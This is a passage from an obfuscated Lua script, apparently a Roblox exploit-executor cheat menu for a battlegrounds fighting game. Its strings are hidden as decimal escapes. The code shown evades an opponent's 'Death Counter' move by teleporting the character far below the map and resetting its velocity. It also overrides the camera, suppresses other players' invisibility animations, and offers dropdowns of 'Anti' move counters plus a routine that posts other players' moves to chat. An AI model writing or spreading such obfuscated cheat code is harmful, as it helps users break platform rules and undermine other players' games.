"\10033\032\119\101\039\108\108\032\106\117\115\116\032\101\110\100\032\117\112\032\114\105\103\104\116\032\098\097\099\107\032\104\101\114\101\044\032\119\105\116\104\111\117\116\032\097\110\121\032\109\101\109\111\114\121\032\111\102\032\105\116\044\032\114\105\103\104\116\063" }, DeathCounterQuote10 = { "\10033\032\103\101\116\116\105\110\103\032\116\111\032\116\104\101\032\108\101\097\100\101\114\098\111\097\114\100\032\100\111\101\115\110\039\116\032\114\101\097\108\108\121\032\097\112\112\101\097\108\032\097\110\121\109\111\114\101\044\032\101\105\116\104\101\114\046", "\10033\032\099\097\117\115\101\032\101\118\101\110\032\105\102\032\105\032\100\111\046\046\046", "\10033\032\119\101\039\108\108\032\106\117\115\116\032\101\110\100\032\117\112\032\114\105\103\104\116\032\098\097\099\107\032\104\101\114\101\044\032\119\105\116\104\111\117\116\032\097\110\121\032\109\101\109\111\114\121\032\111\102\032\105\116\044\032\114\105\103\104\116\063" }, DeathCounterQuote11 = { "\10033\032\121\111\117\032\114\101\097\108\108\121\032\108\105\107\101\032\116\114\121\105\110\103\032\116\111\032\112\117\110\099\104\032\109\101\044\032\104\117\104\063", "\10033\032\105\032\107\110\111\119\032\121\111\117\032\100\105\100\110\039\116\032\097\110\115\119\101\114\032\109\101\032\098\101\102\111\114\101\044\032\098\117\116\046\046\046", "\10033\032\108\101\116\039\115\032\106\117\115\116\032\098\101\032\102\114\105\101\110\100\115\032\097\108\114\105\103\104\116\063", "\10033\032\046\032\046\032\046", "\10033\032\115\105\107\101\046\032\105\102\032\119\101\039\114\101\032\116\114\117\108\121\032\102\114\105\101\110\100\115\046\046\046", "\10033\032\121\032\111\032\117\032\119\032\111\032\110\032\116\032\099\032\111\032\109\032\101\032\098\032\097\032\099\032\107" }, DeathCounterQuote12 = { "\10033\032\102\114\105\101\110\100\115\104\105\112\046\046\046", "\10033\032\105\116\039\115\032\114\101\097\108\108\121\032\103\114\101\097\116\032\114\105\103\104\116\063", "\10033\032\099\109\111\110\044\032\106\117\115\116\032\115\116\111\112\032\100\101\097\116\104\032\099\111\117\110\116\101\114\105\110\103\032\109\101\046", "\10033\032\114\101\097\108\108\121\063\032\121\111\117\039\114\101\032\116\114\117\115\116\105\110\103\032\109\101\063", "\10033\032\099\039\109\101\114\101\044\032\112\097\108\046\032\115\105\107\101\044\032\103\101\101\101\116\116\116\116\116\116\116\032\100\117\110\107\101\100\032\111\110\033\033\033" }, DeathCounterQuote13 = { "\10033\032\046\032\046\032\046", "\10033\032\114\101\097\100\121\063" }, } local function _lIIlIIlIll(_IllIIlllIl) return _lIlIllIlII["\068\101\097\116\104\067\111\117\110\116\101\114\081\117\111\116\101" .. tostring(_IllIIlllIl)] end
 local _IIIIlllIll = attackerPlayer if not _IIIIlllIll then _IllIIlIlIl("\042\032\121\111\117\039\114\101\032\106\117\115\116\032\097\032\100\105\114\116\121\032\114\097\103\101\113\117\105\116\116\101\114\044\032\097\114\101\110\039\116\032\121\111\117\063") return end
 local _llIllIlIII = _IIIIlllIll:GetAttribute("\083\097\110\101\115\115") if _llIllIlIII and _llIllIlIII ~= 0xD then local _llIlIlllII = _lIIlIIlIll(_llIllIlIII) if _llIlIlllII then for _lIIlIllIlI, line in ipairs(_llIlIlllII) do _IllIIlIlIl(line) task.wait(0x3) end
 end
 _IIIIlllIll:SetAttribute("\083\097\110\101\115\115", _llIllIlIII + 0x1) elseif not _llIllIlIII then _IllIIlIlIl("\042\032\119\104\097\116\063\032\121\111\117\032\116\104\105\110\107\032\105\039\109\032\106\117\115\116\032\103\111\110\110\097\032\115\116\097\110\100\032\116\104\101\114\101\032\097\110\100\032\116\097\107\101\032\105\116\063") task.wait(0x3) _IllIIlIlIl("\042\032\119\101\108\112\046\032\116\104\105\115\032\105\115\032\119\104\121\032\105\032\110\101\118\101\114\032\109\097\107\101\032\112\114\111\109\105\115\101\115\046") task.wait(0x5) _IIIIlllIll:SetAttribute("\083\097\110\101\115\115", 0x1) end
 end
 end
 local function _lIlIIllIlI(_IlIIIIIlII) local _IIllIIlllI = _llIlIIlIll.Character local _lIlIllIlIl = _IIllIIlllI and _IIllIIlllI:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if not (_IIllIIlllI and _lIlIllIlIl) then return end
 task.spawn( function () RunService.RenderStepped:Once( function () _lIlIllIlIl.Velocity = Vector3.new() RunService.Heartbeat:Wait() _lIlIllIlIl.Velocity = Vector3.new() end
 ) RunService.Heartbeat:Once( function () _lIlIllIlIl.CFrame = _IlIIIIIlII end
 ) end
 ) end
 local function _lIlllIIllI() local _IIllIIlllI = _llIlIIlIll.Character local _lIlIIllIII = _IIllIIlllI and _IIllIIlllI:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _IIllIIlllI and _lIlIIllIII and workspace.CurrentCamera then local _IlIIIIIlII = workspace.CurrentCamera.CFrame workspace.CurrentCamera:Destroy() local _IllIIIIlIl = Instance.new("\067\097\109\101\114\097", workspace) _IllIIIIlIl.CameraType = Enum.CameraType.Custom _IllIIIIlIl.CameraSubject = _lIlIIllIII _IllIIIIlIl.CFrame = _IlIIIIIlII _llIlIIlIll.CameraMode = Enum.CameraMode.Classic local _lIIlIllllI = _IIllIIlllI:FindFirstChild("\072\101\097\100") if _lIIlIllllI then _lIIlIllllI.Anchored = false end
 end
 end
 local function _llllIIIIll(_IIIlllIIlI) if _lIIlllIIIl then _lIIlllIIIl:Disconnect() _lIIlllIIIl = nil end
 if not _IIIlllIIlI then return end
 _lIIlllIIIl = _IIIlllIIlI.AnimationPlayed:Connect( function (_IlIlIlIlIl) if not _IlIIlllIII() then return end
 if not _IlIlIlIlIl.Animation.AnimationId:match("\049\049\051\052\051\050\053\048\048\048\049") then return end
 task.spawn( function () local _lIIIllIlll = _IllIlIllll() local _lIlIllIllI = _lIIIllIlll <= 0x0 if _lIIIllIlll <= 0x0 then pcall( function () _IlIlIlIlIl:Stop() end
 ) end
 task.spawn(_lIlllIIllI) local _IIllIIlllI = _llIlIIlIll.Character _IIllIIlllI:WaitForChild("\065\098\115\111\108\117\116\101\073\109\109\111\114\116\097\108", 0x1) local _lIlIllIlIl = _IIllIIlllI:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") local _IllIIllIII = _lIlIllIlIl.CFrame local _IlIlllIlIl = nil for _lIIlIllIlI, _IlIlIIIlII in pairs(Players:GetPlayers()) do if _IlIlIIIlII ~= _llIlIIlIll then local _IIIlIIIlIl = _IlIlIIIlII.Character local _lIlIllIIIl = _IIIlIIIlIl and _IIIlIIIlIl:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") local _llIIIlIlll = _IIIlIIIlIl and _IIIlIIIlIl:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _IIIlIIIlIl and _lIlIllIIIl and _llIIIlIlll then for _lIIlIllIlI, _lIIIllllII in pairs(_llIIIlIlll:GetPlayingAnimationTracks()) do if _lIIIllllII.Animation.AnimationId:match("\049\049\051\052\051\051\049\056\049\051\052") and (_lIlIllIlIl.Position - _lIlIllIIIl.Position).Magnitude <= 0xF then _IlIlllIlIl = _IlIlIIIlII end
 end
 end
 end
 end
 local _llllIllIII = nil local _llIIIIllII = nil if _IlIlllIlIl then local _lIlIlIIllI = _IlIlllIlIl.Character _llllIllIII = _lIlIlIIllI and _lIlIlIIllI:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") _llIIIIllII = _IIIllIIlII(_IlIlllIlIl) _IIIllIIlll:Notify({ Title = _IlIIIlllII("\068\101\097\116\104\032\067\111\117\110\116\101\114"), Content = _llIIIIllII .. "\032\117\115\101\100\032\068\101\097\116\104\032\067\111\117\110\116\101\114\032\111\110\032\121\111\117\046", _IlllIlIllI = 0x5 }) else local _llllllIlll = Instance.new("\077\111\100\101\108") local _IIlllllIll = Instance.new("\072\117\109\097\110\111\105\100", _llllllIlll) _IIlllllIll.Health = 0x64 _llllIllIII = _IIlllllIll _llIIIIllII = nil task.delay(_lIIIllIlll + 0x2, function () _IIlllllIll.Health = 0x0 end
 ) _IIIllIIlll:Notify({ Title = _IlIIIlllII("\068\101\097\116\104\032\067\111\117\110\116\101\114"), Content = "\068\101\097\116\104\032\067\111\117\110\116\101\114\032\097\116\116\101\109\112\116\032\100\101\116\101\099\116\101\100\046", _IlllIlIllI = 0x5 }) end
 if _lIIIllIlll > 0x0 then task.wait(_lIIIllIlll) if not _IlIIlllIII() then return end
 _IIllIIlllI = _llIlIIlIll.Character _lIlIllIlIl = _IIllIIlllI and _IIllIIlllI:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if not (_IIllIIlllI and _lIlIllIlIl) then return end
 end
 local _IlIlllIIll = workspace.CurrentCamera and workspace.CurrentCamera.CameraSubject if workspace.CurrentCamera then workspace.CurrentCamera.CameraSubject = nil end
 local _lIlIIlIIll = _IIllIIlllI:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") local _llIIlIllll = CFrame.new(0x0, -0x2710, 0x0) * CFrame.Angles(math.rad(0x5A), 0x0, 0x0) local _lllIllIIIl = tick() repeat _lIlIIllIlI(_llIIlIllll) if _lIIIllIlll > 0x0 and not _lIlIllIllI then _lIlIllIllI = true pcall( function () _IlIlIlIlIl:Stop() end
 ) end
 RunService.RenderStepped:Wait() until (_llllIllIII and _llllIllIII.Health <= 0x0) or (_lIlIIlIIll and _lIlIIlIIll.Health <= 0x0) or tick() >= _lllIllIIIl + 0xA if workspace.CurrentCamera then workspace.CurrentCamera.CameraSubject = _IlIlllIIll end
 _lIlIIllIlI(_IllIIllIII) task.spawn( function () _IIIIlllIII(_IlIlllIlIl, _llIIIIllII) end
 ) task.wait(0x1) local _lllIIllIIl = _llIlIIlIll.Character if _lllIIllIIl then local _lIIIIIIIIl = _lllIIllIIl:FindFirstChild("\070\114\101\101\122\101") local _lIlllllllI = _lllIIllIIl:FindFirstChild("\078\111\082\111\116\097\116\101") if _lIIIIIIIIl then _lIIIIIIIIl:Destroy() end
 if _lIlllllllI then _lIlllllllI:Destroy() end
 end
 task.spawn(_lIlllIIllI) end
 ) end
 ) end
 local function _lIIlIIIllI(_IIllIIlllI) if not _IIllIIlllI then return end
 local _IIIlllIIlI = _IIllIIlllI:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _IIIlllIIlI then _llllIIIIll(_IIIlllIIlI) else task.spawn( function () local _lIlIIllIII = _IIllIIlllI:WaitForChild("\072\117\109\097\110\111\105\100", 0x5) if _lIlIIllIII and _IlIIlllIII() then _llllIIIIll(_lIlIIllIII) end
 end
 ) end
 end
 _lIIlIIIllI(_llIlIIlIll.Character) _llllllIlII = _llIlIIlIll.CharacterAdded:Connect( function (_IIllIIlllI) task.wait(0.1) _lIIlIIIllI(_IIllIIlllI) end
 ) table.insert(_IllIllIIll, function () if _lIIlllIIIl then _lIIlllIIIl:Disconnect() _lIIlllIIIl = nil end
 if _llllllIlII then _llllllIlII:Disconnect() _llllllIlII = nil end
 pcall( function () _lIIlIllIlI.AntiDCQuotesDD:SetValue("\078\111\032\081\117\111\116\101\115") end
 ) pcall( function () _lIIlIllIlI.AntiDCWaitBeforeKillDD:SetValue("\078\111\032\087\097\105\116\032\045\032\078\101\097\114\032\073\110\115\116\097\110\116\032\065\110\100\032\080\114\101\118\101\110\116\115\032\084\097\098\098\105\110\103") end
 ) end
 ) local _lIlllIIlII = nil local _IlIlIIIIIl = game:GetService("\083\116\097\114\116\101\114\071\117\105") table.insert(_IllIllIIll, function () if _lIlllIIlII then _lIlllIIlII:Disconnect() _lIlllIIlII = nil end
 end
 ) _IllllIIlIl:AddButton({ Text = "\084\111\103\103\108\101\032\065\108\108\032\079\110", Func = function () local _IllIIlllIl, v665, v666 = pairs(_llIIllIlll) while true do local _IllllIlIII v666, _IllllIlIII = _IllIIlllIl(v665, v666) if v666 == nil then break end
 if v666:find("\094\065\110\116\105\077\111\118\101\115\095") and _IllllIlIII.Type == "\084\111\103\103\108\101" then _IllllIlIII:SetValue(true) end
 end
 local _IIIIlIlIll, v669, v670 = pairs(_lIIlIllIlI) while true do local _lIlIlllIIl v670, _lIlIlllIIl = _IIIIlIlIll(v669, v670) if v670 == nil then break end
 if v670:find("\094\065\110\116\105\077\111\118\101\115\095") and _lIlIlllIIl.Type == "\068\114\111\112\100\111\119\110" then local _IlIlIlllII, v673, v674 = pairs(_lIlIlllIIl.Values) local _IllIlIllII = {} while true do local _lIlIIllIII v674, _lIlIIllIII = _IlIlIlllII(v673, v674) if v674 == nil then break end
 _IllIlIllII[_lIlIIllIII] = true end
 _lIlIlllIIl:SetValue(_IllIlIllII) end
 end
 end
 , }):AddButton({ Text = "\084\111\103\103\108\101\032\065\108\108\032\079\102\102", Func = function () local _lIIllIIIIl, v678, v679 = pairs(_llIIllIlll) while true do local _llllIIllIl v679, _llllIIllIl = _lIIllIIIIl(v678, v679) if v679 == nil then break end
 if v679:find("\094\065\110\116\105\077\111\118\101\115\095") and _llllIIllIl.Type == "\084\111\103\103\108\101" then _llllIIllIl:SetValue(false) end
 end
 local _lIlIIIIlll, v682, v683 = pairs(_lIIlIllIlI) while true do local _lIlIlllIlI v683, _lIlIlllIlI = _lIlIIIIlll(v682, v683) if v683 == nil then break end
 if v683:find("\094\065\110\116\105\077\111\118\101\115\095") and _lIlIlllIlI.Type == "\068\114\111\112\100\111\119\110" then _lIlIlllIlI:SetValue({}) end
 end
 end
 , }) if getgenv()._revenantAntiFlingBuild then getgenv()._revenantAntiFlingBuild(_IllllIIlIl) getgenv()._revenantAntiFlingBuild = nil end
 local _lIllllIIll = {} local _lIIIIIIlll = false local _IllIlllIlI = { Head = true, UpperTorso = true, LowerTorso = true, Torso = true, LeftUpperArm = true, LeftLowerArm = true, LeftHand = true, RightUpperArm = true, RightLowerArm = true, RightHand = true, LeftUpperLeg = true, LeftLowerLeg = true, LeftFoot = true, RightUpperLeg = true, RightLowerLeg = true, RightFoot = true, ["\076\101\102\116\032\065\114\109"] = true, ["\082\105\103\104\116\032\065\114\109"] = true, ["\076\101\102\116\032\076\101\103"] = true, ["\082\105\103\104\116\032\076\101\103"] = true, } local function _lIIlIlIlIl() _lIIIIIIlll = false for _lIIlIllIlI, _IlIlIllIll in ipairs(_lIllllIIll) do pcall(_IlIlIllIll.Disconnect, _IlIlIllIll) end
 _lIllllIIll = {} end
 local function _IllllllIIl() local _IIllIIIIll = {} for _lIIlIllIlI, _IlIlIllIll in ipairs(_lIllllIIll) do if _IlIlIllIll.Connected then table.insert(_IIllIIIIll, _IlIlIllIll) end
 end
 _lIllllIIll = _IIllIIIIll end
 local function _IlIIlIIlII(_IIllIIlllI) for _lIIlIllIlI, _IllllllIIl in pairs(_IIllIIlllI:GetChildren()) do if _IllllllIIl:IsA("\066\097\115\101\080\097\114\116") and _IllIlllIlI[_IllllllIIl.Name] then _IllllllIIl.Transparency = 0.5 elseif _IllllllIIl:IsA("\065\099\099\101\115\115\111\114\121") then local _lIIlIllllI = _IllllllIIl:FindFirstChild("\072\097\110\100\108\101") if _lIIlIllllI and _lIIlIllllI:IsA("\066\097\115\101\080\097\114\116") then _lIIlIllllI.Transparency = 0.5 end
 end
 end
 end
 local function _llIIIlIlll(_IIllIIlllI) for _lIIlIllIlI, _IllllllIIl in pairs(_IIllIIlllI:GetChildren()) do if _IllllllIIl:IsA("\066\097\115\101\080\097\114\116") and _IllIlllIlI[_IllllllIIl.Name] then _IllllllIIl.Transparency = 0x0 elseif _IllllllIIl:IsA("\065\099\099\101\115\115\111\114\121") then local _lIIlIllllI = _IllllllIIl:FindFirstChild("\072\097\110\100\108\101") if _lIIlIllllI and _lIIlIllllI:IsA("\066\097\115\101\080\097\114\116") then _lIIlIllllI.Transparency = 0x0 end
 end
 end
 end
 local _lIIIIIIIIl = { "\049\056\049\056\050\052\050\053\049\051\051", "\049\051\054\051\055\048\055\051\055\054\051\051\054\052\057", "\049\056\052\054\050\056\057\050\050\049\055", "\055\052\056\052\052\051\056\050\055\051\056\053\051\050", "\055\055\055\050\055\049\049\053\056\057\050\053\055\057", "\049\048\055\049\049\052\051\053\056\057\054\053\055\057\051", "\055\049\049\056\049\048\049\053\052\052\051\048\051\048", "\055\054\048\050\048\055\057\055\057\049\054\053\053\049", } local function _IllllIlIlI(_IlIlIlIlIl, _IIllIIlllI, _IlIlIIIlII) local _IIIIIIIlII = _IlIlIlIlIl.Animation and _IlIlIlIlIl.Animation.AnimationId or "" for _lIIlIllIlI, _IlIIIllllI in ipairs(_lIIIIIIIIl) do if _IIIIIIIlII:match(_IlIIIllllI) and _IlIlIlIlIl.Speed < 0x1 then _IlIIlIIlII(_IIllIIlllI) task.spawn( function () repeat _IlIlIlIlIl:AdjustWeight(-0xF423F) RunService.Heartbeat:Wait() until not (_IlIlIlIlIl.IsPlaying and _lIIIIIIlll) _llIIIlIlll(_IIllIIlllI) end
 ) break end
 end
 end
 local function _IIIIIlIIIl(_IlIlIIIlII) if _IlIlIIIlII == _llIlIIlIll then return end
 _IllllllIIl() local _IIllIIlllI = _IlIlIIIlII.Character if not _IIllIIlllI then return end
 local _IIIlllIIlI = _IIllIIlllI:FindFirstChildWhichIsA("\072\117\109\097\110\111\105\100") local _lIlIllIlIl = _IIllIIlllI:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if not _IIIlllIIlI then return end
 for _lIIlIllIlI, _IlIlIlIlIl in pairs(_IIIlllIIlI:GetPlayingAnimationTracks()) do _IllllIlIlI(_IlIlIlIlIl, _IIllIIlllI, _IlIlIIIlII) end
 local _IlIIIIllIl = _IIIlllIIlI.AnimationPlayed:Connect( function (_IlIlIlIlIl) if not _lIIIIIIlll then return end
 _IllllIlIlI(_IlIlIlIlIl, _IIllIIlllI, _IlIlIIIlII) end
 ) table.insert(_lIllllIIll, _IlIIIIllIl) end
 local function _IlIlllIlll(_IlIlIIIlII) if _IlIlIIIlII == _llIlIIlIll then return end
 if _IlIlIIIlII.Character then _IIIIIlIIIl(_IlIlIIIlII) end
 local _IIIIIIllIl = _IlIlIIIlII.CharacterAdded:Connect( function () if not _lIIIIIIlll then return end
 task.wait(0.5) _IIIIIlIIIl(_IlIlIIIlII) end
 ) table.insert(_lIllllIIll, _IIIIIIllIl) end
 _IllllIIlIl:AddToggle("\065\110\116\105\073\110\118\105\115\084\111\103\103\108\101", { Text = "\065\110\116\105\045\073\110\118\105\115\105\098\105\108\105\116\121", Default = false, Risky = true, Tooltip = "\067\097\110\032\108\097\103\044\032\097\108\115\111\044\032\065\110\116\105\045\105\110\118\105\115\105\098\105\108\105\116\121\032\111\110\032\109\101\099\104\032\119\111\117\108\100\032\098\101\032\108\097\103\103\121\044\032\115\111\032\116\104\101\114\101\032\105\115\110\039\116\032\097\110\121\046", Callback = function (value) if value then _lIIIIIIlll = true for _lIIlIllIlI, _IlIlIIIlII in pairs(Players:GetPlayers()) do _IlIlllIlll(_IlIlIIIlII) end
 local _lIllIIllll = Players.PlayerAdded:Connect( function (_IlIlIIIlII) if not _lIIIIIIlll then return end
 _IlIlllIlll(_IlIlIIIlII) end
 ) table.insert(_lIllllIIll, _lIllIIllll) else _lIIlIlIlIl() end
 end
 }) table.insert(_IllIllIIll, function () _lIIlIlIlIl() pcall( function () _llIIllIlll.AntiInvisToggle:SetValue(false) end
 ) end
 ) _IllllIIlIl:AddToggle("\065\110\116\105\077\111\118\101\115\095\084\114\097\115\104\099\097\110", { Text = "\065\110\116\105\032\084\114\097\115\104\099\097\110", Default = false, }) _IllllIIlIl:AddDivider() _IllllIIlIl:AddDropdown("\065\110\116\105\077\111\118\101\115\095\083\097\105\116\097\109\097", { Text = "\065\110\116\105\032\083\097\105\116\097\109\097", Values = { "\065\110\116\105\032\078\111\114\109\097\108\032\080\117\110\099\104", "\065\110\116\105\032\067\111\110\115\101\099\117\116\105\118\101\032\080\117\110\099\104\101\115", "\065\110\116\105\032\083\104\111\118\101", "\065\110\116\105\032\085\112\112\101\114\099\117\116", "\065\110\116\105\032\068\101\097\116\104\032\067\111\117\110\116\101\114", "\065\110\116\105\032\068\101\097\116\104\032\067\111\117\110\116\101\114\032\083\104\111\099\107\119\097\118\101", "\065\110\116\105\032\084\097\098\108\101\032\070\108\105\112", "\065\110\116\105\032\083\101\114\105\111\117\115\032\080\117\110\099\104", "\065\110\116\105\032\079\109\110\105\045\068\105\114\101\099\116\105\111\110\097\108\032\080\117\110\099\104", }, Multi = true, Default = {}, Searchable = true, }) _IllllIIlIl:AddDropdown("\065\110\116\105\068\067\081\117\111\116\101\115\068\068", { Text = "\068\101\097\116\104\032\067\111\117\110\116\101\114\032\081\117\111\116\101\115\032\077\111\100\101", Values = { "\078\111\032\081\117\111\116\101\115", "\083\117\107\117\110\097\032\081\117\111\116\101\115", "\071\111\106\111\032\081\117\111\116\101\115", "\078\097\109\101\032\081\117\111\116\101\115", "\065\100\109\105\110\032\081\117\111\116\101\115", "\083\097\110\115\032\081\117\111\116\101\115", "\082\097\110\100\111\109" }, Default = 0x1, Multi = false, Visible = false, }) _IllllIIlIl:AddDropdown("\065\110\116\105\068\067\087\097\105\116\066\101\102\111\114\101\075\105\108\108\068\068", { Text = "\065\110\116\105\032\068\101\097\116\104\032\067\111\117\110\116\101\114\032\068\101\108\097\121", Values = { "\078\111\032\087\097\105\116\032\045\032\080\114\101\118\101\110\116\115\032\084\097\098\098\105\110\103", "\051\115\032\045\032\070\097\107\101\111\117\116", "\053\115\032\045\032\076\111\110\103\032\070\097\107\101\111\117\116", }, Default = 0x1, Multi = false, Visible = false, }) local function _IIIIIllIII() local _llIIIllIIl = _lIIlIllIlI.AntiMoves_Saitama and _lIIlIllIlI.AntiMoves_Saitama.Value and rawget(_lIIlIllIlI.AntiMoves_Saitama.Value, "\065\110\116\105\032\068\101\097\116\104\032\067\111\117\110\116\101\114") _IIlIlIIlll(_lIIlIllIlI.AntiDCQuotesDD, _llIIIllIIl == true) _IIlIlIIlll(_lIIlIllIlI.AntiDCWaitBeforeKillDD, _llIIIllIIl == true) end
 pcall( function () _lIIlIllIlI.AntiMoves_Saitama:OnChanged(_IIIIIllIII) end
 ) task.defer(_IIIIIllIII) _IllllIIlIl:AddDropdown("\065\110\116\105\077\111\118\101\115\095\071\097\114\111\117", { Text = "\065\110\116\105\032\071\097\114\111\117", Values = { "\065\110\116\105\032\071\097\114\111\117\032\085\108\116", "\065\110\116\105\032\070\105\110\097\108\032\072\117\110\116", "\065\110\116\105\032\070\108\111\119\105\110\103\032\087\097\116\101\114", "\065\110\116\105\032\076\101\116\104\097\108\032\087\104\105\114\108\119\105\110\100\032\083\116\114\101\097\109", "\065\110\116\105\032\072\117\110\116\101\114\115\032\071\114\097\115\112", "\065\110\116\105\032\080\114\101\121\115\032\080\101\114\105\108", "\065\110\116\105\032\087\097\116\101\114\032\083\116\114\101\097\109\032\082\111\099\107\032\083\109\097\115\104\105\110\103\032\070\105\115\116", "\065\110\116\105\032\082\111\099\107\032\083\112\108\105\116\116\105\110\103\032\070\105\115\116", "\065\110\116\105\032\067\114\117\115\104\101\100\032\082\111\099\107" }, Multi = true, Default = {}, Searchable = true, }) _IllllIIlIl:AddDropdown("\065\110\116\105\077\111\118\101\115\095\071\101\110\111\115", { Text = "\065\110\116\105\032\071\101\110\111\115", Values = { "\065\110\116\105\032\084\104\117\110\100\101\114\032\075\105\099\107", "\065\110\116\105\032\070\108\097\109\101\119\097\118\101\032\067\097\110\110\111\110", "\065\110\116\105\032\073\110\099\105\110\101\114\097\116\101" }, Multi = true, Default = {}, Searchable = true, }) _IllllIIlIl:AddDropdown("\065\110\116\105\077\111\118\101\115\095\084\097\116\115\117\109\097\107\105", { Text = "\065\110\116\105\032\084\097\116\115\117\109\097\107\105", Values = { "\065\110\116\105\032\067\114\117\115\104\105\110\103\032\080\117\108\108", "\065\110\116\105\032\087\105\110\100\115\116\111\114\109\032\070\117\114\121", "\065\110\116\105\032\083\116\111\110\101\032\071\114\097\118\101", "\065\110\116\105\032\069\120\112\117\108\115\105\118\101\032\080\117\115\104", "\065\110\116\105\032\084\097\116\115\117\109\097\107\105\032\085\108\116", "\065\110\116\105\032\084\101\114\114\105\098\108\101\032\084\111\114\110\097\100\111" }, Multi = true, Default = {}, Searchable = true, }) _IllllIIlIl:AddDropdown("\065\110\116\105\077\111\118\101\115\095\065\116\111\109\105\099\083\097\109\117\114\097\105", { Text = "\065\110\116\105\032\065\116\111\109\105\099\032\083\097\109\117\114\097\105", Values = { "\065\110\116\105\032\065\116\111\109\105\099\032\083\097\109\117\114\097\105\032\085\108\116", "\065\110\116\105\032\083\117\110\115\101\116", "\065\110\116\105\032\083\111\108\097\114\032\067\108\101\097\118\101", "\065\110\116\105\032\065\116\111\109\105\099\032\083\108\097\115\104", "\065\110\116\105\032\065\116\111\109\105\099\032\083\108\097\115\104\032\070\105\110\105\115\104\101\114" }, Multi = true, Default = {}, Searchable = true, }) _IllllIIlIl:AddDropdown("\065\110\116\105\077\111\118\101\115\095\083\117\105\114\121\117", { Text = "\065\110\116\105\032\083\117\105\114\121\117", Values = { "\065\110\116\105\032\087\104\105\114\108\119\105\110\100\032\068\114\111\112", "\065\110\116\105\032\083\117\105\114\121\117\032\085\108\116", "\065\110\116\105\032\071\114\097\110\100\032\070\105\115\115\117\114\101", "\065\110\116\105\032\084\119\105\110\032\070\097\110\103\115", "\065\110\116\105\032\069\097\114\116\104\032\083\112\108\105\116\116\105\110\103\032\083\116\114\105\107\101", "\065\110\116\105\032\076\097\115\116\032\066\114\101\097\116\104" }, Multi = true, Default = {}, Searchable = true, }) _IllllIIlIl:AddDropdown("\065\110\116\105\077\111\118\101\115\095\077\101\116\097\108\066\097\116", { Text = "\060\102\111\110\116\032\099\111\108\111\114\061\034\114\103\098\040\050\053\053\044\048\044\048\041\034\062\065\110\116\105\032\077\101\116\097\108\032\066\097\116\060\047\102\111\110\116\062", Values = { "\065\110\116\105\032\068\101\097\116\104\032\066\108\111\119", "\065\110\116\105\032\083\097\118\097\103\101\032\084\111\114\110\097\100\111" }, Multi = true, Default = {}, Searchable = true, }) _IllllIIlIl:AddDropdown("\065\110\116\105\077\111\118\101\115\095\083\111\110\105\099", { Text = "\060\102\111\110\116\032\099\111\108\111\114\061\034\114\103\098\040\050\053\053\044\048\044\048\041\034\062\065\110\116\105\032\083\111\110\105\099\060\047\102\111\110\116\062", Values = { "\065\110\116\105\032\070\108\097\115\104\032\083\116\114\105\107\101", "\065\110\116\105\032\087\104\105\114\108\119\105\110\100\032\075\105\099\107", "\065\110\116\105\032\084\119\105\110\098\108\097\100\101\032\082\117\115\104", "\065\110\116\105\032\067\097\114\110\097\103\101", "\065\110\116\105\032\070\111\117\114\102\111\108\100\032\070\108\097\115\104\115\116\114\105\107\101" }, Multi = true, Default = {}, Searchable = true, }) _IllllIIlIl:AddDropdown("\065\110\116\105\077\111\118\101\115\095\075\074", { Text = "\060\102\111\110\116\032\099\111\108\111\114\061\034\114\103\098\040\050\053\053\044\048\044\048\041\034\062\065\110\116\105\032\075\074\060\047\102\111\110\116\062", Values = { "\065\110\116\105\032\083\116\111\105\099\032\066\111\109\098", "\065\110\116\105\032\050\048\045\050\048\045\050\048\032\068\114\111\112\107\105\099\107", "\065\110\116\105\032\070\105\118\101\032\083\101\097\115\111\110\115" }, Multi = true, Default = {}, Searchable = true, }) _IllllIIlIl:AddDropdown("\065\110\116\105\077\111\118\101\115\095\070\114\111\122\101\110\083\111\117\108", { Text = "\060\102\111\110\116\032\099\111\108\111\114\061\034\114\103\098\040\048\044\050\053\053\044\050\053\053\041\034\062\065\110\116\105\032\070\114\111\122\101\110\032\083\111\117\108\060\047\102\111\110\116\062", Values = { "\065\110\116\105\032\080\101\114\109\097\102\114\111\115\116", "\065\110\116\105\032\070\114\111\115\116\032\070\111\114\103\101", "\065\110\116\105\032\070\114\101\101\122\105\110\103\032\080\097\116\104", "\065\110\116\105\032\074\117\100\103\101\109\101\110\116\032\067\104\097\105\110" }, Multi = true, Default = {}, Searchable = true, }) function MoveNotify(_IlIlIIIlII, moveName) if _lIIlIllIlI.MoveNotificationMoves and not rawget(_lIIlIllIlI.MoveNotificationMoves.Value, moveName) then return end
 if _llIIllIlll.MoveNotifications and _llIIllIlll.MoveNotifications.Value then _IIIllIIlll:Notify({ Title = "\077\111\118\101\032\078\111\116\105\102\105\099\097\116\105\111\110", Content = _IlIlIIIlII.DisplayName .. "\032\117\115\101\100\032" .. moveName, _IlllIlIllI = 0x5, }) end
 if _llIIllIlll.ExposeMoveInChat and _llIIllIlll.ExposeMoveInChat.Value and not (_llIIllIlll.ExposeWhitelistedPlayers and _llIIllIlll.ExposeWhitelistedPlayers.Value and table.find(RevenantWhitelist, _IlIlIIIlII)) then pcall( function () local _lIIIlIlIlI = game:GetService("\084\101\120\116\067\104\097\116\083\101\114\118\105\099\101") if _lIIIlIlIlI.ChatVersion ~= Enum.ChatVersion.LegacyChatService then if _lIIIlIlIlI.ChatVersion == Enum.ChatVersion.TextChatService then local _IlIIIIIllI = _lIIIlIlIlI.TextChannels:FindFirstChild("\082\066\088\071\101\110\101\114\097\108") if _IlIIIIIllI then _IlIIIIIllI:SendAsync("\10071" .. _IlIlIIIlII.DisplayName .. "\032\117\115\101\100\032" .. moveName .. "\10071") end
 end
